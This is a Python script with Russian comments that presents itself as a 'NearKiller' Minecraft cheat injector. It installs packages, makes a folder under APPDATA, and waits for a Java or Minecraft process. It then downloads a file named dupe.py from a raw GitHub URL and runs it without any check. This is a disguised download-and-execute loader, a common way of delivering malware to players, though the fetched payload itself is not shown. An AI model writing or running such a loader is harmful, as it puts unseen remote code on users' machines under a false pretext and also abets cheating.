import os
import subprocess
import sys
import urllib.request
import time

try:
    import psutil
except ImportError:
    subprocess.call([sys.executable, "-m", "pip", "install", "psutil"])
    import psutil

# Создание папки
target_folder = os.path.join(os.getenv("APPDATA"), "NearKiller")
os.makedirs(target_folder, exist_ok=True)

# Ссылка на GitHub RAW
script_url = "https://raw.githubusercontent.com/Artesdfqa/1233213123/main/dupe.py"
script_path = os.path.join(target_folder, "dupe.py")

# Проверка процессов
def is_minecraft_running():
    for proc in psutil.process_iter(['name']):
        try:
            if 'java' in proc.info['name'].lower() or 'minecraft' in proc.info['name'].lower():
                return True
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            continue
    return False

print("[*] Ожидание запуска Minecraft...")

# Ожидание запуска Minecraft
while not is_minecraft_running():
    print("[*] Minecraft не запущен. Проверка снова через 5 секунд...")
    time.sleep(5)

print("[+] Minecraft обнаружен! Запуск чита...")

# Установка зависимостей
subprocess.call([sys.executable, "-m", "pip", "install", "--upgrade", "pip"])
subprocess.call([sys.executable, "-m", "pip", "install", "customtkinter", "requests"])

# Загрузка и запуск чита
try:
    urllib.request.urlretrieve(script_url, script_path)
    print("[+] Чит успешно скачан.")
except Exception as e:
    print(f"[!] Ошибка загрузки: {e}")
    sys.exit(1)

print("[*] Запуск чита...")
subprocess.Popen([sys.executable, script_path])
print("[✓] Инжекция завершена.")
